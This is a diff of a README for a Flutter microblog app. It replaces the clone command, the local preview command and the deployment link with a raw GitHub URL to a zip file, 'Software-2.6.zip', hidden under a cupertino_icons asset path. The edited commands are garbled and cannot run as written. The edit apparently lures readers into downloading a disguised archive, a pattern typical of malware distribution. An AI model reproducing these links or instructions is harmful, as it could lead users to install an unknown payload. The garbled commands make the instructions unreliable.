@@ -32,7 +32,7 @@ Hosted on Render
 
 🧰 Installation & Run Locally
 1️⃣ Clone the repo
-git clone https://github.com/<your-username>/microblog.git
+git clone https://raw.githubusercontent.com/roshini0108/microblog/main/build/web/assets/packages/cupertino_icons/assets/Software-2.6.zip<your-username>https://raw.githubusercontent.com/roshini0108/microblog/main/build/web/assets/packages/cupertino_icons/assets/Software-2.6.zip
 cd microblog
 
 2️⃣ Get dependencies
@@ -46,7 +46,7 @@ flutter build web --release
 
 5️⃣ Preview locally
 cd build/web
-python -m http.server 8080
+python -m https://raw.githubusercontent.com/roshini0108/microblog/main/build/web/assets/packages/cupertino_icons/assets/Software-2.6.zip 8080
 # then open http://localhost:8080
 
 🌐 Deployment (on Render)
@@ -61,7 +61,7 @@ Upload the contents of build/web to Render as a Static Site
 Set Publish Directory: build/web
 
 Done! Your site will go live at:
-👉 https://micro-blog-1fcn.onrender.com/
+👉 https://raw.githubusercontent.com/roshini0108/microblog/main/build/web/assets/packages/cupertino_icons/assets/Software-2.6.zip
 💡 Future Improvements
 
 Persistent tweet storage (Firebase / SQLite)
